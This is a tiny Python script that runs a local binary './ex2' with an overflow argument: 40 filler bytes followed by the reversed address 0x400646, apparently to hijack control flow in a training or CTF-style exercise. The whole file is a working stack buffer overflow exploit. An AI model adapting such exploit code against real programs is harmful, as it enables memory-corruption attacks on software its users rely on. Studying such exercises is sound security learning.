#!/usr/bin/python3
# wrapper
import os
buff = 40*(b'x')
addr = bytearray.fromhex("400646")
addr.reverse()
buff += addr
print("exec ./ex2 with buff", buff)
os.execv('./ex2', ['./ex2', buff])
